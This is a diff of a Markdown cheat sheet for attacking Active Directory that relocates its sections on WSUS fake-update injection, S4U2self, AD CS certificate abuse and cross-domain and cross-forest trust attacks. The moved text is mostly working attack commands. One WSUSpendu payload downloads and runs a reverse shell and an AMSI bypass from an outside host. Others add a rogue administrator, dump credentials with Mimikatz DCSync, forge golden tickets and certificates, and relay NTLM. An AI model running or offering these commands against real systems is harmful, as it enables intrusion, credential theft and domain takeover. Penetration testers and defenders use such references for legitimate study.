@@ -1297,412 +1297,6 @@ Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samacc
 Get-AdmPwdPassword -ComputerName <MACHINE NAME>
 ```
 
-## Attacking WSUS
-- Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!
-
-### Enumeration
-#### Identify usage of WSUS on hosts
-- Can be executed on host to check if a wsus server is configured
-```
-reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
-```
-
-### WSUS module
-- https://learn.microsoft.com/en-us/powershell/module/updateservices/?view=windowsserver2022-ps
-- Module is available on the WSUS server itself
-
-#### Get information about the WSUS server
-```
-Get-WsusServer
-```
-
-#### Get information about the computers which uses WSUS
-```
-Get-WsusComputer
-```
-
-### Injecting fake update - MTM
-- When deployed without SSL encryption, its possible to perform man-in-the-middle attack and inject a fake update
-- Requirements
-  - WSUS without SSL encryption
-  - Only deliver binaries signed by MS, such as psexec
-  - Must perform arp spoofing or tamper with the system's proxy settings 
-- https://github.com/ctxis/wsuspect-proxy
-- https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf
-
-#### Identify usage of WSUS
-```
-reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
-```
-
-#### Retrieve WSUS URL
-```
-reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
-```
-
-### Injecting fake update - ARP spoofing
-- https://github.com/pimps/wsuxploit
-- If unable to perform ARP Spoofing due to an arpspoof issue, use bettercap while the wsuxplit.sh is running.
-  - https://github.com/evilsocket/bettercap 
-
-### Inject fake update
-```
-.\wsuxploit.sh <TARGE IP> <WSUS IP> <WSUS PORT> <PATH TO SIGNED BINARY>
-```
-
-### Injecting fake update - WPAD injection
-#### Check if automatic detection of the proxy is performed
-- If the 5th byte of the result of the query is even, automatic detection of the proxy may be set in Internet Explorer. Then we can use a poisoner like Responder or Inveigh to perform WPAD injection.
-```
-req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
-```
-
-### Injecting fake update - Access to WSUS server
-- WSUS server is most likely be interconnected to servers containing sensitive information.
-- After comprimising the WSUS server it might be possible to acces networks you weren't able before.
-- Inject a fake update directory to the WSUS server
-  - https://github.com/AlsidOfficial/WSUSpendu 
-
-#### Update - Make new user
-```
-.\Wsuspendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs '-accepteula -s -d cmd.exe /c "net user <USER> <PASSWORD> /add && net localgroup Administrators <USER> /add"' -ComputerName <COMPUTER>
-```
-
-#### Update - Rev shell
-- Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!
-```
-.\WSUSpendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs 'powershell iex (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx:8530/amsi.txt"); iex (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx:8530/Invoke-PowerShellTcp.ps1")'
-```
-
-#### Get unnaproved updates and approve them
-```
-Get-WsusUpdate -Approval Unapproved
-Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -TargetGroupName "All Computers"
-```
-
-## S4U2self
-- Gain access to a domain computer if we have its RC4, AES256 or TGT.
-- There are means of obtaining a TGT for a computer without already having local admin access to it, such as pairing the Printer Bug and a machine with unconstrained delegation, NTLM relaying scenarios and Active Directory Certificate Service abuse
-
-#### Dump TGT
-```
-.\Rubeus.exe triage
-.\Rubeus.exe dump /luid:<LUID> /service:krbtgt
-```
-
-#### Request TGS
-```
-.\Rubeus.exe s4u /user:<COMPUTERNAME>$ /msdsspn:cifs/<COMPUTER FQDN> /impersonateuser:<USER TO IMPERSONATE> /ticket:<TGT BASE64> /nowrap
-```
-
-- S4u2proxy will fail, the s4uself works. Copy the s4u2self base64 string
-
-#### Save it to disk
-```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
-```
-
-#### Get information of the ticket
-```
-.\Rubeus.exe describe /ticket:C:\Users\public\<USER>.kirbi
-```
-
-- The Servicename is not valid for our use - we want it to be for CIFS.  This can be easily changed, because as we saw in the constrained delegation alternate service name demo, the service name is not in the encrypted part of the ticket and is not "checked".
-- Open it in ```Asn1Editor```.  Find the two instances where the GENERAL STRING <COMOTERNAME>$" appears.
-- Double-click them to open the Node Content Editor and replace these strings with "cifs".  We also need to add an additional string node with the FQDN of the machine. Right-click on the parent SEQUENCE and select New.  Enter 1b in the Tag field and click OK.  Double-click on the new node to edit the text.
-- First one should be CIFS, second one the FQDN of the machine.
- 
-![afbeelding](https://user-images.githubusercontent.com/43987245/159697361-dab68723-e4d7-4966-9e6c-fad2f658457b.png)
-
-#### Load the ticket
-```
-.\Rubeus.exe /ticket:<TICKET BASE64>
-.\Rubeus.exe /ticket:<FILE TO KIRBI FILE>
-```
- 
-#### Execute ls on the computer
-```
-ls \\<COMPOTERNAME FQDN>\C$
-```
- 
-## Active Directory Certificate Services
-- Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
-- https://github.com/GhostPack/Certify
-
-#### Find AD CS Certificate authorities (CA's)
-```
-.\Certify.exe cas
-```
-
-### Misconfigured Certificate Templates
-- AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.
-
-#### Find misconfigured certificate templates
-- Look for ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is enabled.
-- This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain
-```
-.\Certify.exe find /vulnerable
-```
-
-#### Request certificate for a user
-- For example domain admin
-```
-.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE> /altname:<USERNAME>
-```
-- Save cert + key in a cert.pem file
-
-#### Transform cert to pfx
-- Set a password, password
-```
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-```
-
-#### Rubeus ask TGT using the certificate
-```
-cat cert.pfx | base64 -w 0
-.\Rubeus.exe asktgt /user:<USERNAME> /certificate:<BASE64 CERT> /password:password /aes256 /nowrap
-```
-
-#### Write TGT kirbi
-```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
-```
- 
-#### Then load TGT and request TGS or access systems as this user.
-
-### Relaying to ADCS HTTP Endpoints
-- AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at http[s]://<hostname>/certsrv, and by default supports NTLM and Negotiate authentication methods.
-
-#### Start ntlmrelayx.py
-```
-ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
-```
- 
-#### Force authentication
-```
-.\SpoolSample.exe <IP> <IP>
-```
- 
-#### Ouput should give a TGT which can be used with S4U2self
-- LINK TO S4U2self
- 
-### Forged Certificates
-#### Dump the private keys
-- Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
-- https://github.com/GhostPack/SharpDPAPI
-```
-.\SharpDPAPI.exe certificates /machine
-```
-- Save cert + key in a cert.pem file
-
-#### Transform cert to pfx
-- Set a password, password
-```
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-```
-
-#### Create a forged certificate
-```
-.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@<DOMAIN>" --NewCertPath fake.pfx --NewCertPassword "password"
-```
-
-#### Create a TGT
-```
-cat cert.pfx | base64 -w 0
-.\Rubeus.exe asktgt /user:Administrator /domain:<DOMAIN> /certificate:<BASE64 CERT> /password:password /nowrap
-```
-
-#### Write TGT kirbi
-```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
-```
- 
-#### Then load TGT and request TGS or access systems as this user.
- 
-## Cross Domain attacks
-## Azure AD
-#### Enumerate where PHS AD connect is installed
-```
-Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
-```
-
-#### On the AD connect server extract MSOL_ Credentials
-```
-.\adconnect.ps1
-```
-
-#### Run cmd as MSOL_
-```
-runas /user:<DOMAIN>\<USER> /netonly cmd
-```
-
-#### Execute DCSync
-- use ```/all``` instead of ```/user``` to list all users
-```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
-```
-
-## Child to Forest Root
-### Trust key
-- Abuses SID History
-#### Dump trust keys
-- Look for in trust key from child to parent (first command)
-- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
-```
-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
-```
-
-#### Create an inter-realm TGT
-- Uses well know Enterprise Admins SIDS
-- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
-```
-Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
-```
-
-#### Create a TGS using Rubeus and inject current Powershell session
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
-```
-.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
-```
-
-#### Check access on target machine
-```
-ls \\<FQDN>\c$
-Enter-PSSession -ComputerName <FQDN>
- .\PsExec64.exe \\<COMPUTERNAME> cmd
-```
-
-#### Run DCSync to get credentials:
-- use ```/all``` instead of ```/user``` to list all users
-```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
-```
-
-### Krbtgt hash
-- Abuses SID History
-#### Get krbtgt hash from dc
-```
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <DC>
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"' -Computername <DC>
-```
-
-#### Create TGT and inject in current session
-- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
-- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
-- Also possible to use the <DOMAIN SID>-519 (519 is the enterprise admin group)
-- Remove ```/ptt``` to save ticket to file
-```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
-```
- 
-- *Opsec way*
-```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /aes256:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /startoffset:-10 /endin:600 /renewmax:10080 /ptt"'
-```
-
-#### Check access on target machine
-```
-ls \\<FQDN>\c$
-Enter-PSSession -ComputerName <FQDN>
- .\PsExec64.exe \\<COMPUTERNAME> cmd
-```
-
-#### Run DCSync to get credentials:
-- use ```/all``` instead of ```/user``` to list all users
-```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
-```
-
-## Crossforest attacks
-### Kerberoast2
-#### Enumerate users with SPN cross-forest
-```
-Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName} 
-```
-
-#### Request and crack TGS see:
-See [Kerberoast](#Kerberoast) 
-
-### Printer bug2
--  It also works across a Two-way forest trust if TGT Delegation is enabled!
-
-#### Check if TGTDelegation is enabled (run on DC)
-```
-netdom trust <CURRENT FOREST> /domain:<TRUSTED FOREST> /EnableTgtDelegation
-```
-
-See [Printer Bug](#Printer-bug) for exploitation
-
-### Trust key2
--  By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary which are explicity shared with a specific forest.
--  There is no way to enumerate which resources are shared.
-
-#### Dump trust keys
-- Look for in trust key from child to parent (first command)
-```
-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
-```
-
-#### Create a intern-forest TGT
-```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SIDS> /ticket:<KIRBI FILE>"'
-```
-
-#### Create and inject TGS
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
-```
-.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
-```
-
-#### Check access to server
-```
-dir \\<SERVER NAME>\<SHARE>\
-```
-
-### SID history enabled
-- This is fine but why can't we access all resources just like Intra forest?
-- SID Filtering is the answer. It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary. This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.
-- If a external trust has SID history enabled. It is possible to inject a SIDHistory for RID => 1000 (higher then 1000) to access resources accessible to that identity or group in the target trusting forest. Needs to be user created!
-- This means, if we have an external trust (or a forest trust with SID history enabled /enablesidhistory:yes), we can inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest. 
-
-#### Enumerate if SIDFilteringForestAware is enabled
-- Run on the DC.
-```
-Get-ADTrust -Filter *
-```
-
-#### Enumerate groups of the target forest with SID higher then 1000
-```
-Get-ADGroup -Filter 'SID -ge "<TARGET FOREST SID>-1000"' -Server <TARGET FOREST>
-```
- 
-#### Get trust key
-```
-Invoke-Mimikatz -Command '"lsadump::trust /patch"'
-```
- 
-#### Get domain SID
-```
-Get-DomainSID
-```
- 
-#### Create a intern-forest TGT
-```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SID OF THE GROUP>  /ticket:<KIRBI FILE>"'
-```
-
-#### Create and inject TGS
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
-```
-.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
-```
-
-#### Use the TGS and execute DCsync or psremoting etc!
-
 ## SQL Server
 - Could be possible cross domain or cross forest!
 ```
@@ -2128,6 +1722,412 @@ SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
 ```
 SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
 ```
+
+## Attacking WSUS
+- Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!
+
+### Enumeration
+#### Identify usage of WSUS on hosts
+- Can be executed on host to check if a wsus server is configured
+```
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
+```
+
+### WSUS module
+- https://learn.microsoft.com/en-us/powershell/module/updateservices/?view=windowsserver2022-ps
+- Module is available on the WSUS server itself
+
+#### Get information about the WSUS server
+```
+Get-WsusServer
+```
+
+#### Get information about the computers which uses WSUS
+```
+Get-WsusComputer
+```
+
+### Injecting fake update - MTM
+- When deployed without SSL encryption, its possible to perform man-in-the-middle attack and inject a fake update
+- Requirements
+  - WSUS without SSL encryption
+  - Only deliver binaries signed by MS, such as psexec
+  - Must perform arp spoofing or tamper with the system's proxy settings 
+- https://github.com/ctxis/wsuspect-proxy
+- https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf
+
+#### Identify usage of WSUS
+```
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
+```
+
+#### Retrieve WSUS URL
+```
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+```
+
+### Injecting fake update - ARP spoofing
+- https://github.com/pimps/wsuxploit
+- If unable to perform ARP Spoofing due to an arpspoof issue, use bettercap while the wsuxplit.sh is running.
+  - https://github.com/evilsocket/bettercap 
+
+### Inject fake update
+```
+.\wsuxploit.sh <TARGE IP> <WSUS IP> <WSUS PORT> <PATH TO SIGNED BINARY>
+```
+
+### Injecting fake update - WPAD injection
+#### Check if automatic detection of the proxy is performed
+- If the 5th byte of the result of the query is even, automatic detection of the proxy may be set in Internet Explorer. Then we can use a poisoner like Responder or Inveigh to perform WPAD injection.
+```
+req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
+```
+
+### Injecting fake update - Access to WSUS server
+- WSUS server is most likely be interconnected to servers containing sensitive information.
+- After comprimising the WSUS server it might be possible to acces networks you weren't able before.
+- Inject a fake update directory to the WSUS server
+  - https://github.com/AlsidOfficial/WSUSpendu 
+
+#### Update - Make new user
+```
+.\Wsuspendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs '-accepteula -s -d cmd.exe /c "net user <USER> <PASSWORD> /add && net localgroup Administrators <USER> /add"' -ComputerName <COMPUTER>
+```
+
+#### Update - Rev shell
+- Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!
+```
+.\WSUSpendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs 'powershell iex (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx:8530/amsi.txt"); iex (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx:8530/Invoke-PowerShellTcp.ps1")'
+```
+
+#### Get unnaproved updates and approve them
+```
+Get-WsusUpdate -Approval Unapproved
+Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -TargetGroupName "All Computers"
+```
+
+## S4U2self
+- Gain access to a domain computer if we have its RC4, AES256 or TGT.
+- There are means of obtaining a TGT for a computer without already having local admin access to it, such as pairing the Printer Bug and a machine with unconstrained delegation, NTLM relaying scenarios and Active Directory Certificate Service abuse
+
+#### Dump TGT
+```
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:<LUID> /service:krbtgt
+```
+
+#### Request TGS
+```
+.\Rubeus.exe s4u /user:<COMPUTERNAME>$ /msdsspn:cifs/<COMPUTER FQDN> /impersonateuser:<USER TO IMPERSONATE> /ticket:<TGT BASE64> /nowrap
+```
+
+- S4u2proxy will fail, the s4uself works. Copy the s4u2self base64 string
+
+#### Save it to disk
+```
+[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+```
+
+#### Get information of the ticket
+```
+.\Rubeus.exe describe /ticket:C:\Users\public\<USER>.kirbi
+```
+
+- The Servicename is not valid for our use - we want it to be for CIFS.  This can be easily changed, because as we saw in the constrained delegation alternate service name demo, the service name is not in the encrypted part of the ticket and is not "checked".
+- Open it in ```Asn1Editor```.  Find the two instances where the GENERAL STRING <COMOTERNAME>$" appears.
+- Double-click them to open the Node Content Editor and replace these strings with "cifs".  We also need to add an additional string node with the FQDN of the machine. Right-click on the parent SEQUENCE and select New.  Enter 1b in the Tag field and click OK.  Double-click on the new node to edit the text.
+- First one should be CIFS, second one the FQDN of the machine.
+ 
+![afbeelding](https://user-images.githubusercontent.com/43987245/159697361-dab68723-e4d7-4966-9e6c-fad2f658457b.png)
+
+#### Load the ticket
+```
+.\Rubeus.exe /ticket:<TICKET BASE64>
+.\Rubeus.exe /ticket:<FILE TO KIRBI FILE>
+```
+ 
+#### Execute ls on the computer
+```
+ls \\<COMPOTERNAME FQDN>\C$
+```
+ 
+## Active Directory Certificate Services
+- Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
+- https://github.com/GhostPack/Certify
+
+#### Find AD CS Certificate authorities (CA's)
+```
+.\Certify.exe cas
+```
+
+### Misconfigured Certificate Templates
+- AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.
+
+#### Find misconfigured certificate templates
+- Look for ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is enabled.
+- This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain
+```
+.\Certify.exe find /vulnerable
+```
+
+#### Request certificate for a user
+- For example domain admin
+```
+.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE> /altname:<USERNAME>
+```
+- Save cert + key in a cert.pem file
+
+#### Transform cert to pfx
+- Set a password, password
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Rubeus ask TGT using the certificate
+```
+cat cert.pfx | base64 -w 0
+.\Rubeus.exe asktgt /user:<USERNAME> /certificate:<BASE64 CERT> /password:password /aes256 /nowrap
+```
+
+#### Write TGT kirbi
+```
+[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+```
+ 
+#### Then load TGT and request TGS or access systems as this user.
+
+### Relaying to ADCS HTTP Endpoints
+- AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at http[s]://<hostname>/certsrv, and by default supports NTLM and Negotiate authentication methods.
+
+#### Start ntlmrelayx.py
+```
+ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
+```
+ 
+#### Force authentication
+```
+.\SpoolSample.exe <IP> <IP>
+```
+ 
+#### Ouput should give a TGT which can be used with S4U2self
+- LINK TO S4U2self
+ 
+### Forged Certificates
+#### Dump the private keys
+- Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
+- https://github.com/GhostPack/SharpDPAPI
+```
+.\SharpDPAPI.exe certificates /machine
+```
+- Save cert + key in a cert.pem file
+
+#### Transform cert to pfx
+- Set a password, password
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Create a forged certificate
+```
+.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@<DOMAIN>" --NewCertPath fake.pfx --NewCertPassword "password"
+```
+
+#### Create a TGT
+```
+cat cert.pfx | base64 -w 0
+.\Rubeus.exe asktgt /user:Administrator /domain:<DOMAIN> /certificate:<BASE64 CERT> /password:password /nowrap
+```
+
+#### Write TGT kirbi
+```
+[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+```
+ 
+#### Then load TGT and request TGS or access systems as this user.
+ 
+## Cross Domain attacks
+## Azure AD
+#### Enumerate where PHS AD connect is installed
+```
+Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
+```
+
+#### On the AD connect server extract MSOL_ Credentials
+```
+.\adconnect.ps1
+```
+
+#### Run cmd as MSOL_
+```
+runas /user:<DOMAIN>\<USER> /netonly cmd
+```
+
+#### Execute DCSync
+- use ```/all``` instead of ```/user``` to list all users
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
+```
+
+## Child to Forest Root
+### Trust key
+- Abuses SID History
+#### Dump trust keys
+- Look for in trust key from child to parent (first command)
+- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+#### Create an inter-realm TGT
+- Uses well know Enterprise Admins SIDS
+- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
+```
+
+#### Create a TGS using Rubeus and inject current Powershell session
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+```
+.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
+```
+
+#### Check access on target machine
+```
+ls \\<FQDN>\c$
+Enter-PSSession -ComputerName <FQDN>
+ .\PsExec64.exe \\<COMPUTERNAME> cmd
+```
+
+#### Run DCSync to get credentials:
+- use ```/all``` instead of ```/user``` to list all users
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
+```
+
+### Krbtgt hash
+- Abuses SID History
+#### Get krbtgt hash from dc
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <DC>
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"' -Computername <DC>
+```
+
+#### Create TGT and inject in current session
+- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
+- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | Select-Object samaccountname, objectsid```
+- Also possible to use the <DOMAIN SID>-519 (519 is the enterprise admin group)
+- Remove ```/ptt``` to save ticket to file
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
+```
+ 
+- *Opsec way*
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /aes256:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /startoffset:-10 /endin:600 /renewmax:10080 /ptt"'
+```
+
+#### Check access on target machine
+```
+ls \\<FQDN>\c$
+Enter-PSSession -ComputerName <FQDN>
+ .\PsExec64.exe \\<COMPUTERNAME> cmd
+```
+
+#### Run DCSync to get credentials:
+- use ```/all``` instead of ```/user``` to list all users
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
+```
+
+## Crossforest attacks
+### Kerberoast2
+#### Enumerate users with SPN cross-forest
+```
+Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName} 
+```
+
+#### Request and crack TGS see:
+See [Kerberoast](#Kerberoast) 
+
+### Printer bug2
+-  It also works across a Two-way forest trust if TGT Delegation is enabled!
+
+#### Check if TGTDelegation is enabled (run on DC)
+```
+netdom trust <CURRENT FOREST> /domain:<TRUSTED FOREST> /EnableTgtDelegation
+```
+
+See [Printer Bug](#Printer-bug) for exploitation
+
+### Trust key2
+-  By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary which are explicity shared with a specific forest.
+-  There is no way to enumerate which resources are shared.
+
+#### Dump trust keys
+- Look for in trust key from child to parent (first command)
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+#### Create a intern-forest TGT
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SIDS> /ticket:<KIRBI FILE>"'
+```
+
+#### Create and inject TGS
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
+```
+.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
+```
+
+#### Check access to server
+```
+dir \\<SERVER NAME>\<SHARE>\
+```
+
+### SID history enabled
+- This is fine but why can't we access all resources just like Intra forest?
+- SID Filtering is the answer. It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary. This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.
